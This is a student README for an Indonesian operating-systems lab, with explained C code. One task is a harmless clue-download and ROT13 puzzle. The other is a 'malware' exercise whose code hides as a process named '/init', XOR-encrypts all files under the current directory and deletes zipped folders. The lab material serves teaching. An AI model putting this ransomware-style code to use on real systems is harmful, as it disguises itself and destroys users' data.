# Sisop-2-2025-IT08

Anggota IT08:
| Nama | NRP |
| ---------------------- | ---------- |
| Arya Bisma Putra Refman | 5027241036 |
| Moch. Rizki Nasrullah | 5027241038 |
| Nadia Fauziazahra Kusumastuti | 5027241094 |
----

## Soal 1
[Author: Fico/ purofuro]

Kamu terbangun secara tiba-tiba di suatu [lokasi](https://dragon-pw-checker.vercel.app/) yang tidak diketahui, saat kamu melihat sekitar yang terlihat hanyalah kegelapan dan sebuah pintu dengan dua mata berwarna yang melihatmu dari lubang pintu tersebut.

![image](https://github.com/user-attachments/assets/70fcb5b1-5b0d-4d48-abfc-72f626587adc)

Ia merupakan naga bernama Cyrus yang menjaga pintu tersebut dan kamu harus meng-input password yang benar untuk masuk. Karena tidak mungkin untuk menebak password, Ia memberikanmu sebuah clue [Clues.zip](https://drive.google.com/file/d/1xFn1OBJUuSdnApDseEczKhtNzyGekauK/view). Untungnya, kamu merupakan Directory Lister yang jago sehingga clue ini dapat berubah menjadi sebuah password.

```bash
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <sys/stat.h>
#include <unistd.h>
#include <ctype.h>
#include <sys/wait.h>

#define CLUE_DIR "Clues"
#define FILTERED_DIR "Filtered"
```
- Mempersiapkan library dan mendeklarasikan variabel untuk pengelolaan direktori dan operasi file

A. "Downloading the Clues" → Karena kamu telah diberikan sebuah link Clues oleh Cyrus, kamu membuat file bernama action.c yang dimana kalau dijalankan seperti biasa tanpa argumen tambahan akan mendownload dan meng-unzip file tersebut secara langsung. Saat kamu melihat isi dari Clues tersebut, isinya berupa 4 folder yakni ClueA - ClueD dan di masing-masing folder tersebut terdapat .txt files dan isinya masih tidak jelas, mungkin beberapa kata di dalam .txt file yang dapat dicari di inventory website? (Note: inventory bersifat untuk seru-seruan saja).  Jangan lupa untuk menghapus Clues.zip setelah diekstrak dan buatlah apabila folder Clues sudah ada, maka command tersebut tidak akan mendownload Clues.zip lagi apabila dijalankan.

```bash
nano action.c
```
- Membuat script `action.c`

```bash
void run_command(char *const argv[]) {
    pid_t pid = fork();
    if (pid == 0) {
        execvp(argv[0], argv);
        perror("execvp failed");
        exit(EXIT_FAILURE);
    } else if (pid < 0) {
        perror("fork failed");
        exit(EXIT_FAILURE);
    } else {
        int status;
        waitpid(pid, &status, 0);
    }
}
```
- `char *const argv[]`: Mendeklarasikan parameter yang menerima array pointer (array yang berisi alamat string) dan menjamin bahwa elemen array (pointer) tidak akan diubah. Namun, string yang ditunjuk oleh pointer masih bisa dimodifikasi.
- `pid_t pid = fork();`: Membuat proses anak, dimana fungsi fork() mengembalikan nilai 0 pada proses anak (di mana kode berikutnya akan dieksekusi oleh anak), nilai positif (PID dari proses anak) pada proses induk, dan nilai negatif jika fork() gagal.
- `if (pid == 0) { execvp(argv[0], argv); perror("execvp failed"); exit(EXIT_FAILURE); }`: Jika berada dalam proses anak, jalankan perintah yang diberikan (execvp). Jika gagal, tampilkan pesan error dan keluar dari proses anak dengan status gagal.
- `else if (pid < 0) { perror("fork failed"); exit(EXIT_FAILURE); }`: Jika `fork()` gagal (nilai negatif), cetak pesan error dan keluar dari program dengan status gagal.
- `else { int status; waitpid(pid, &status, 0); }`: Jika berada di proses induk, tunggu proses anak hingga selesai dengan `waitpid`.

```bash
void download_and_extract() {
    struct stat st;
    if (stat(CLUE_DIR, &st) == 0 && S_ISDIR(st.st_mode)) {
        printf("Folder %s already exists. Skipping download.\n", CLUE_DIR);
        return;
    }
    printf("Downloading Clues.zip...\n");

    char *wget_args[] = {
        "wget",
        "-q",
        "--show-progress",
        "https://drive.usercontent.google.com/u/0/uc?id=1xFn1OBJUuSdnApDseEczKhtNzyGekauK&export=download",
        "-O",
        "Clues.zip",
        NULL
    };
    run_command(wget_args);

    char *unzip_args[] = {
        "unzip",
        "-q",
        "Clues.zip",
        NULL
    };
    run_command(unzip_args);

    char *rm_args[] = {
        "rm",
        "Clues.zip",
        NULL
    };
    run_command(rm_args);

    printf("Downloaded and extracted Clues.zip\n");
}
```
- `struct stat st;`: Mendeklarasikan variabel st untuk menyimpan informasi status file atau folder.
- `if (stat(CLUE_DIR, &st) == 0 && S_ISDIR(st.st_mode))`: Mengecek apakah folder `Clues` sudah ada. Jika iya, tampilkan pesan dan hentikan fungsi.
- `char *wget_args[] = { ... }; run_command(wget_args);`: Menyiapkan argumen untuk `wget` dan menjalankannya menggunakan `run_command()` untuk mengunduh file `Clues.zip`.
- `char *unzip_args[] = { ... }; run_command(unzip_args);`: Menyiapkan argumen untuk `unzip` dan menjalankan perintah `unzip` untuk mengekstrak `Clues.zip`.
- `char *rm_args[] = { ... }; run_command(rm_args);`: Menyiapkan argumen untuk `rm` dan menjalankan perintah untuk menghapus `Clues.zip`.
- `printf("Downloaded and extracted Clues.zip\n");`: Menampilkan pesan bahwa proses download dan ekstraksi telah selesai.
![image](https://github.com/user-attachments/assets/bb6a5270-c517-4f29-871b-4759dac7b45c)

B. "Filtering the Files" → Karena kebanyakan dari file tersebut berawal dengan 1 huruf atau angka, kamu pun mencoba untuk memindahkan file-file yang hanya dinamakan dengan 1 huruf dan 1 angka tanpa special character kedalam folder bernama Filtered. Kamu tidak suka kalau terdapat banyak clue yang tidak berguna jadi disaat melakukan filtering, file yang tidak terfilter dihapus. Karena kamu tidak ingin membuat file kode lagi untuk filtering, maka kamu menggunakan file sebelumnya untuk filtering file-file tadi dengan menambahkan argumen saat ingin menjalankan action.c

```bash
int is_valid_file(const char *name) {
    int len = strlen(name);
    return len == 5 &&
           name[1] == '.' && name[2] == 't' && name[3] == 'x' && name[4] == 't' &&
           isalnum(name[0]);
}
```
- `int len = strlen(name);`: Menghitung panjang nama file.
- `return len == 5 && ...`: Mengembalikan true (1) jika panjang nama file adalah 5 karakter, karakter ke-2 hingga ke-5 membentuk ekstensi `.txt`, dan karakter pertama adalah alfanumerik (a-z, A-Z, atau 0-9).

```bash
void filter_files() {
    DIR *d;
    struct dirent *dir;
    mkdir(FILTERED_DIR, 0755);

    char *folders[] = {"Clues/ClueA", "Clues/ClueB", "Clues/ClueC", "Clues/ClueD"};
    for (int i = 0; i < 4; i++) {
        d = opendir(folders[i]);
        if (!d) continue;

        while ((dir = readdir(d)) != NULL) {
            if (strcmp(dir->d_name, ".") == 0 || strcmp(dir->d_name, "..") == 0)
                continue;

            char src_path[512];
            snprintf(src_path, sizeof(src_path), "%s/%s", folders[i], dir->d_name);

            if (is_valid_file(dir->d_name)) {
                char dest_path[512];
                snprintf(dest_path, sizeof(dest_path), "%s/%s", FILTERED_DIR, dir->d_name);

                FILE *src = fopen(src_path, "r");
                FILE *dest = fopen(dest_path, "w");
                if (src && dest) {
                    char ch;
                    while ((ch = fgetc(src)) != EOF)
                        fputc(ch, dest);
                }
                if (src) fclose(src);
                if (dest) fclose(dest);
            }
        }
        closedir(d);
    }

    for (int i = 0; i < 4; i++) {
        d = opendir(folders[i]);
        if (!d) continue;
        while ((dir = readdir(d)) != NULL) {
            if (strcmp(dir->d_name, ".") == 0 || strcmp(dir->d_name, "..") == 0)
                continue;

            char del_path[512];
            snprintf(del_path, sizeof(del_path), "%s/%s", folders[i], dir->d_name);
            remove(del_path);
        }
        closedir(d);
    }

    printf("Filtering completed. Original clue files removed.\n");
}
```
- `mkdir(FILTERED_DIR, 0755);`: Membuat folder Filtered dengan permission rwxr-xr-x.
- `char *folders[] = {...};`: Menyimpan path empat folder Clue.
- `for (int i = 0; i < 4; i++) { ... if (is_valid_file(dir->d_name)) { ... } }`: Membuka setiap folder clue, membaca seluruh isi folder, dan jika nama file valid `(?.txt)`, salin file-nya ke folder Filtered/.
- `for (int i = 0; i < 4; i++) { ... remove(del_path); }`: Setelah proses salin selesai, ulangi pembacaan folder dan hapus semua file di folder ClueA–ClueD.
![image](https://github.com/user-attachments/assets/ab59e8fb-c97e-4460-9992-61e91412be46)

C. "Combine the File Content" → Di setiap file .txt yang telah difilter terdapat satu huruf dan agar terdapat progress, Cyrus memberikan clue tambahan untuk meletakan/redirect isi dari setiap .txt file tersebut kedalam satu file yaitu Combined.txt dengan menggunakan FILE pointer. Tetapi, terdapat urutan khusus saat redirect isi dari .txt tersebut, yaitu urutannya bergantian dari .txt dengan nama angka lalu huruf lalu angka lagi lalu huruf lagi. Lalu semua file .txt sebelumnya dihapus. Seperti halnya tadi, agar efisien kamu ingin menjalankan action.c dengan argumen tambahan.

```bash
int is_digit_filename(const char *filename) {
    return strlen(filename) == 5 && isdigit(filename[0]) && strcmp(filename + 1, ".txt") == 0;
}

int is_alpha_filename(const char *filename) {
    return strlen(filename) == 5 && isalpha(filename[0]) && strcmp(filename + 1, ".txt") == 0;
}

int cmp_filename(const void *a, const void *b) {
    return strcmp(*(const char **)a, *(const char **)b);
}
```
- `int is_digit_filename(const char *filename)`: Mengecek apakah filename memiliki format panjang 5 karakter, karakter pertama adalah digit (0–9), dan diikuti string `.txt`.
- `int is_alpha_filename(const char *filename)`: Mengecek apakah filename memiliki format panjang 5 karakter, karakter pertama adalah huruf (a–z atau A–Z), dan diikuti `.txt`.
- `int cmp_filename(const void *a, const void *b)`: Fungsi pembanding untuk sorting (ex. `qsort`) dan mengurutkan dua string (nama file) secara alfabetis dengan `strcmp`.

```bash
void combine_files() {
    DIR *d = opendir(FILTERED_DIR);
    struct dirent *dir;
    char *digits[100], *alphas[100];
    int d_count = 0, a_count = 0;

    if (!d) {
        perror("Could not open Filtered directory");
        return;
    }

    while ((dir = readdir(d)) != NULL) {
        if (is_digit_filename(dir->d_name)) {
            digits[d_count++] = strdup(dir->d_name);
        } else if (is_alpha_filename(dir->d_name)) {
            alphas[a_count++] = strdup(dir->d_name);
        }
    }
    closedir(d);

    qsort(digits, d_count, sizeof(char *), cmp_filename);
    qsort(alphas, a_count, sizeof(char *), cmp_filename);

    FILE *combined = fopen("Combined.txt", "w");
    if (!combined) {
        perror("Failed to create Combined.txt");
        return;
    }

    int i = 0, j = 0;
    while (i < d_count || j < a_count) {
        if (i < d_count) {
            char path[512];
            snprintf(path, sizeof(path), "%s/%s", FILTERED_DIR, digits[i]);
            FILE *f = fopen(path, "r");
            if (f) {
                char ch;
                while ((ch = fgetc(f)) != EOF)
                    fputc(ch, combined);
                fclose(f);
                remove(path);
            }
            free(digits[i]);
            i++;
        }

        if (j < a_count) {
            char path[512];
            snprintf(path, sizeof(path), "%s/%s", FILTERED_DIR, alphas[j]);
            FILE *f = fopen(path, "r");
            if (f) {
                char ch;
                while ((ch = fgetc(f)) != EOF)
                    fputc(ch, combined);
                fclose(f);
                remove(path);
            }
            free(alphas[j]);
            j++;
        }
    }

    fclose(combined);
    printf("Combined.txt created.\n");
}
```
- `DIR *d = opendir(FILTERED_DIR);`: Membuka direktori Filtered.
- `char *digits[100], *alphas[100];`: Array penampung nama file digit dan huruf.
- `while ((dir = readdir(d)) != NULL) { if (is_digit_filename(dir->d_name)) ... else if (is_alpha_filename(dir->d_name)) ... }`: Memisahkan file berdasarkan apakah diawali digit (1.txt) atau huruf (a.txt), lalu disimpan di `array`.
- `qsort(...);`: Mengurutkan nama file secara alfabetis.
- `while (i < d_count || j < a_count) { if (i < d_count) { ... } if (j < a_count) { ... } }`: Membaca isi file digit pertama → tulis ke `Combined.txt`, hapus file → lanjut ke file huruf pertama → ulangi sampai semua habis dan Menggunakan `fgetc` dan `fputc` untuk salin isi file karakter demi karakter.
- `fclose(combined); printf("Combined.txt created.\n");`: Menutup file gabungan dan menampilkan pesan sukses.
![image](https://github.com/user-attachments/assets/acef4c98-b692-4208-bf87-8fc9c54feed0)

D. "Decode the file" → Karena isi Combined.txt merupakan string yang random, kamu memiliki ide untuk menggunakan Rot13 untuk decode string tersebut dan meletakan hasil dari yang telah di-decode tadi kedalam file bernama Decoded.txt. Jalankan file action.c dengan argumen tambahan untuk proses decoding ini.

```bash
char rot13(char c) {
    if ('a' <= c && c <= 'z') return 'a' + (c - 'a' + 13) % 26;
    if ('A' <= c && c <= 'Z') return 'A' + (c - 'A' + 13) % 26;
    return c;
}
```
- Fungsi `rot13 chiper`: Mengenkripsi/dekripsi huruf dengan mengganti setiap huruf dengan huruf ke-13 setelahnya dalam alfabet, hanya berlaku untuk huruf (A-Z, a-z).

```bash
void decode_file() {
    FILE *in = fopen("Combined.txt", "r");
    FILE *out = fopen("Decoded.txt", "w");
    if (!in || !out) return;

    char c;
    while ((c = fgetc(in)) != EOF) fputc(rot13(c), out);

    fclose(in);
    fclose(out);
    printf("Decoded.txt created.\n");
}
```
- `FILE *in = fopen("Combined.txt", "r");`: Membuka file gabungan untuk dibaca.
- `FILE *out = fopen("Decoded.txt", "w");`: Membuka/menyiapkan file hasil dekripsi untuk ditulis.
- `if (!in || !out) return;`: Jika salah satu file gagal dibuka, keluar dari fungsi.
- `while ((c = fgetc(in)) != EOF) fputc(rot13(c), out);`: Baca tiap karakter dari `Combined.txt`, lalu terapkan fungsi `rot13()` dan tulis hasilnya ke `Decoded.txt`.
- `fclose(in); fclose(out);`: Menutup kedua file setelah proses selesai.
- `printf("Decoded.txt created.\n");`: Menampilkan pesan bahwa file hasil dekripsi berhasil dibuat.
![image](https://github.com/user-attachments/assets/f0847dec-91af-4ad8-b302-97f7e2fc75bf)

```bash
int main(int argc, char *argv[]) {
    if (argc == 1) {
        download_and_extract();
    } else if (argc == 3 && strcmp(argv[1], "-m") == 0) {
        if (strcmp(argv[2], "Filter") == 0) {
            filter_files();
        } else if (strcmp(argv[2], "Combine") == 0) {
            combine_files();
        } else if (strcmp(argv[2], "Decode") == 0) {
            decode_file();
        } else {
            fprintf(stderr, "Invalid mode. Usage: ./action [-m Filter|Combine|Decode]\n");
            return 1;
        }
    } else {
        fprintf(stderr, "Usage: ./action [-m Filter|Combine|Decode]\n");
        return 1;
    }
    return 0;
}
```
- `if (argc == 1) { download_and_extract(); }`: Jika tidak ada argumen selain nama program, maka program akan menjalankan download_and_extract(), yaitu mendownload dan mengekstrak file zip.
- `else if (argc == 3 && strcmp(argv[1], "-m") == 0) { ... }`: Jika ada dua argumen tambahan (-m dan mode), program akan memeriksa mode yang dipilih:
      - Filter → memanggil filter_files() untuk menyaring file.
      - Combine → memanggil combine_files() untuk menggabungkan file.
      - Decode → memanggil decode_file() untuk mendekripsi file.
- `else { fprintf(stderr, "Invalid mode..."); return 1; }`: Jika mode yang diberikan tidak valid, program akan menampilkan pesan kesalahan dan keluar dengan kode status 1.

E. "Password Check" → Karena kamu sudah mendapatkan password tersebut, kamu mencoba untuk mengecek apakah password yang sudah kamu dapatkan itu benar atau tidak dengan cara di-input ke lokasi tadi.
![image](https://github.com/user-attachments/assets/235bd86f-aa48-48b8-bc7a-58774ee576b7)

![image](https://github.com/user-attachments/assets/564c88b9-638c-43b7-8797-f4510c940839)

## Soal 2

## Soal 3
[Author: Afnaan / honque]

Dok dok dorokdok dok rodok. Anomali malware yang dikembangkan oleh Andriana di PT Mafia Security Cabang Ngawi yang hanya keluar di malam pengerjaan soal shift modul 2. Konon katanya anomali ini akan mendatangi praktikan sisop yang tidak mengerjakan soal ini. Ihh takutnyeee. Share ke teman teman kalian yang tidak mengerjakan soal ini

![image](https://github.com/user-attachments/assets/a5aa5a54-1cca-42a2-930a-9e7cc9966b19)

A. Malware ini bekerja secara daemon dan menginfeksi perangkat korban dan menyembunyikan diri dengan mengganti namanya menjadi /init.

```bash
    if (argc > 0 && strcmp(argv[0], "init") == 0) {
        daemonize();
        chdir(cwd);
        prctl(PR_SET_NAME, (unsigned long) "/init", 0, 0, 0);
```
- `if (argc > 0 && strcmp(argv[0], "init") == 0)`: Mengecek apakah argumen pertama (argv[0], yaitu nama program) adalah "init"—artinya program dipanggil dengan nama penyamaran /init.
- `daemonize();`: Mengubah proses menjadi daemon (background process) agar berjalan terus-menerus di latar belakang, tanpa terminal.
- `chdir(cwd);`: Berpindah ke direktori kerja (cwd) yang sebelumnya sudah ditentukan agar daemon tahu lokasi kerjanya.
- `prctl(PR_SET_NAME, (unsigned long) "/init", 0, 0, 0);`: Mengatur nama proses di sistem menjadi "/init" untuk menyamarkan diri seolah proses sistem utama.

B. Anak fitur pertama adalah sebuah encryptor bernama wannacryptor yang akan memindai directory saat ini dan mengenkripsi file dan folder (serta seluruh isi folder) di dalam directory tersebut menggunakan xor dengan timestamp saat program dijalankan. Encryptor pada folder dapat bekerja dengan dua cara, mengenkripsi seluruh isi folder secara rekursif, atau mengubah folder dan isinya ke dalam zip lalu mengenkripsi zip tersebut. Jika menggunakan metode rekursif, semua file di dalam folder harus terenkripsi , dari isi folder paling dalam sampai ke current directory, dan tidak mengubah struktur folder Jika menggunakan metode zip, folder yang dienkripsi harus dihapus oleh program. Pembagian metode sebagai berikut: Untuk kelompok ganjil menggunakan metode rekursif, dan kelompok genap menggunakan metode zip.

```bash
void encrypt_all_files(const char *dirpath, const char *self_exe) {
    DIR *dir = opendir(dirpath);
    if (!dir) return;

    struct dirent *entry;
    char fullpath[1024];

    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;

        snprintf(fullpath, sizeof(fullpath), "%s/%s", dirpath, entry->d_name);

        struct stat st;
        if (stat(fullpath, &st) == -1) continue;

        if (S_ISDIR(st.st_mode)) {
            encrypt_all_files(fullpath, self_exe);
        } else if (S_ISREG(st.st_mode)) {
            if (strcmp(fullpath, self_exe) != 0) {
                printf("Enkripsi: %s\n", fullpath);
                simple_xor_encrypt(fullpath);
            }
        }
    }

    closedir(dir);
}
```
- `void encrypt_all_files(const char *dirpath, const char *self_exe) { ... }`: Fungsi untuk melakukan enkripsi seluruh file reguler dalam sebuah direktori (termasuk subdirektorinya), kecuali file executable dirinya sendiri.
- `DIR *dir = opendir(dirpath); if (!dir) return;`: Membuka direktori dirpath, jika gagal langsung keluar.
- `struct dirent *entry; char fullpath[1024];`: Menyimpan entri direktori dan path lengkap dari file yang akan diproses.
- `while ((entry = readdir(dir)) != NULL) { if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;`: Loop setiap isi direktori,serta abaikan `.` dan `..`.
- `snprintf(fullpath, sizeof(fullpath), "%s/%s", dirpath, entry->d_name);`: Gabungkan path direktori dan nama file jadi path lengkap.
- `struct stat st; if (stat(fullpath, &st) == -1) continue;`: Dapatkan informasi file, skip jika gagal.
- `if (S_ISDIR(st.st_mode)) { encrypt_all_files(fullpath, self_exe); }`: Jika file adalah direktori, rekursif panggil `encrypt_all_files`.
- `else if (S_ISREG(st.st_mode)) { if (strcmp(fullpath, self_exe) != 0) { printf("Enkripsi: %s\n", fullpath); simple_xor_encrypt(fullpath); } }`: Jika file reguler dan bukan file dirinya sendiri (`self_exe`), cetak info dan enkripsi file dengan fungsi `simple_xor_encrypt`.
- `closedir(dir);`: Tutup direktori setelah selesai.

```bash
void delete_directory(const char *path) {
    DIR *dir = opendir(path);
    if (!dir) return;

    struct dirent *entry;
    char fullpath[1024];

    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;

        snprintf(fullpath, sizeof(fullpath), "%s/%s", path, entry->d_name);

        struct stat st;
        if (stat(fullpath, &st) == -1) continue;

        if (S_ISDIR(st.st_mode)) {
            delete_directory(fullpath);
        } else {
            unlink(fullpath);
        }
    }

    closedir(dir);
    rmdir(path);
}
```
- `void delete_directory(const char *path) {`: Fungsi untuk menghapus seluruh isi folder (termasuk subfolder) dan folder itu sendiri.
- `DIR *dir = opendir(path); if (!dir) return;`: Buka direktori path, jika gagal (misal tidak ada), keluar dari fungsi.
- `struct dirent *entry; char fullpath[1024];`: entry untuk membaca isi direktori. fullpath untuk menyimpan path lengkap dari file/subfolder.
- `while ((entry = readdir(dir)) != NULL) { if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;`: Loop tiap entri, abaikan entri `.` dan `..`.
- `snprintf(fullpath, sizeof(fullpath), "%s/%s", path, entry->d_name);`: Buat path lengkap dari file/folder saat ini.
- `struct stat st; if (stat(fullpath, &st) == -1) continue;`: Ambil informasi file/folder tersebut, skip jika gagal.
- `if (S_ISDIR(st.st_mode)) { delete_directory(fullpath); } else { unlink(fullpath); }`: Jika fullpath adalah folder → panggil `delete_directory` secara rekursif, sedangkan jika file biasa → hapus dengan `unlink`.
- `closedir(dir); rmdir(path);`: Setelah semua isi direktori dihapus, tutup dan hapus direktori itu sendiri.

```bash
void simple_xor_encrypt(const char *filename) {
    FILE *f = fopen(filename, "rb+");
    if (!f) {
        perror("Gagal buka file untuk enkripsi");
        return;
    }

    time_t timestamp = time(NULL);
    unsigned char key[8];
    for (int i = 0; i < 8; i++) {
        key[i] = (timestamp >> (i * 8)) & 0xFF;
    }

    int c;
    size_t i = 0;
    while ((c = fgetc(f)) != EOF) {
        fseek(f, -1, SEEK_CUR);
        fputc(c ^ key[i % 8], f);
        i++;
    }

    fclose(f);
}
```
- `void simple_xor_encrypt(const char *filename) {`: Fungsi untuk melakukan enkripsi XOR sederhana terhadap isi file yang diberikan.
- `FILE *f = fopen(filename, "rb+"); if (!f) { perror("Gagal buka file untuk enkripsi"); return; }`: Buka file dalam mode baca-tulis biner (rb+), supaya bisa baca dan langsung menulis kembali hasil enkripsinya ke tempat yang sama, sedangkan jika gagal, tampilkan error dan keluar dari fungsi.
- `time_t timestamp = time(NULL);`: Ambil timestamp saat ini untuk menjadi dasar dalam membuat key enkripsi.
- `unsigned char key[8]; for (int i = 0; i < 8; i++) { key[i] = (timestamp >> (i * 8)) & 0xFF; }`: Buat key XOR 8-byte dari timestamp, dipecah byte per byte (little endian style).
- `int c; size_t i = 0; while ((c = fgetc(f)) != EOF) { fseek(f, -1, SEEK_CUR); fputc(c ^ key[i % 8], f); i++; }`: Loop baca byte demi byte. Setelah membaca byte, `fseek` mundur 1 langkah ke belakang (karena kita ingin menulis di tempat yang sama). Lalu byte tersebut diXOR dengan key, lalu tulis hasilnya. `i % 8` disini untuk memutar penggunaan 8-byte key secara siklik.
- `fclose(f);`: tutup file setelah enkripsi setelah selesai.

```bash
void zip_and_encrypt() {
    DIR *dir = opendir(".");
    if (!dir) {
        perror("Gagal buka direktori");
        return;
    }

    struct dirent *entry;
    char exe_path[1024];
    readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);
    exe_path[sizeof(exe_path) - 1] = '\0';

    pid_t zip_pids[1024];
    char folders_to_delete[1024][256];
    int pid_index = 0;
    int folder_index = 0;

    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;

        struct stat st;
        if (stat(entry->d_name, &st) == -1)
            continue;

        if (S_ISDIR(st.st_mode)) {
            char zipname[1024];
            snprintf(zipname, sizeof(zipname), "%s.zip", entry->d_name);

            pid_t pid = fork();
            if (pid == 0) {
                char *argv[] = {"zip", "-r", zipname, entry->d_name, NULL};
                execvp("zip", argv);
                perror("execvp zip gagal");
                exit(1);
            } else if (pid > 0) {
                zip_pids[pid_index++] = pid;
                strncpy(folders_to_delete[folder_index++], entry->d_name, sizeof(folders_to_delete[0]));
            }
        }
    }
    closedir(dir);

    for (int i = 0; i < pid_index; i++) {
        int status;
        waitpid(zip_pids[i], &status, 0);
        if (WIFEXITED(status) && WEXITSTATUS(status) != 0) {
            fprintf(stderr, "Zip gagal untuk folder indeks %d\n", i);
        }
    }

    encrypt_all_files(".", exe_path);
    printf("Enkripsi selesai.\n");

    for (int i = 0; i < folder_index; i++) {
        delete_directory(folders_to_delete[i]);
        printf("Folder %s dihapus.\n", folders_to_delete[i]);
    }
}
```
- `DIR *dir = opendir(".");`: Buka direktori saat ini (.) untuk membaca semua file dan folder di dalamnya.
- `if (!dir) { perror("Gagal buka direktori"); return; }`: Jika gagal membuka direktori, tampilkan pesan error ke stderr dan hentikan fungsi.
- `readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1); exe_path[sizeof(exe_path) - 1] = '\0';`: Ambil path lengkap dari executable saat ini, lalu akhiri string dengan null terminator agar valid sebagai string.
- `pid_t zip_pids[1024]; char folders_to_delete[1024][256]; int pid_index = 0; int folder_index = 0;`: Array untuk menyimpan PID dari proses zip, nama folder yang nanti akan dihapus, dan indeksnya masing-masing.

## Soal 4

